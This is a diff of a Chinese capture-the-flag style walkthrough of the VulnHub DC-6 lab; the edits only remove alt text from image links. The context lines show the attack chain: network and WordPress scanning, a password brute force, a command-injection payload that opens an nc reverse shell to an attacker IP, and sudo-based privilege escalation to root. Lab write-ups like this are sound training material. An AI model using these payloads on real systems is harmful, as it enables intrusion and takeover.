@@ -71,7 +71,7 @@ OK, this isn't really a clue as such, but more of some "we don't want to spend f
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.140` 就是目标了
 
@@ -80,7 +80,7 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.140
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/2.png)
 
 一个 SSH 一个 web,先从 web 入手
 
@@ -93,14 +93,14 @@ echo "192.168.141.140 wordy" >> /etc/hosts
 
 访问 web,发现是个 wordpress 搭建的网站
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/3.png)
 
 按照之前 DC2 的经验来,上 wpscan 扫他一波
 ```bash
 wpscan --url http://wordy --enumerate u
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/4.png)
 
 发现几个用户,尝试爆破弱口令,上了 TOP100 没爆出来,回过头来一看作者给了提示
 ```
@@ -113,7 +113,7 @@ cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
 wpscan --url http://wordy --passwords passwords.txt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/5.png)
 
 跑出一个 mark
 ```
@@ -139,7 +139,7 @@ burp 抓包利用
 127.0.0.1| nc -e /bin/sh 192.168.141.134 4444
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/6.png)
 
 成功弹回
 
@@ -152,7 +152,7 @@ burp 抓包利用
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/7.png)
 
 www 用户下啥也没有，tmp 空的，看了下 passwd 有几个 wordpress 一样的用户,拿 helpdesk01 测试了下几个用户都登不上去,顺便翻了下他们的家目录,mark 和 jens 都有东西
 
@@ -163,20 +163,20 @@ ls /home/sarah
 ls /home/jens
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/8.png)
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/9.png)
 
 可以，直接给了我 graham 账号密码,登上去,然后继续查看
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/10.png)
 
 看样子只是个备份脚本,但是没有权限运行,暂放一边,查看下能提权的东西把
 ```
 sudo -l
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/11.png)
 
 巧了，这个正好可以用 jens sudo 运行,那修改这个脚本来获取 jens 的 shell 试试
 ```
@@ -185,14 +185,14 @@ sudo -u jens /home/jens/backups.sh
 whoami
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/12.png)
 
 切换成功,jens 下在看看有啥能提权的
 ```bash
 sudo -l
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/13.png)
 
 看着着熟悉的4个字母,不禁露出了猥琐的笑容
 ```bash
@@ -204,6 +204,6 @@ cd /root
 cat *
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC6/14.png)
 
 提权成功,感谢靶机作者 @DCUA7
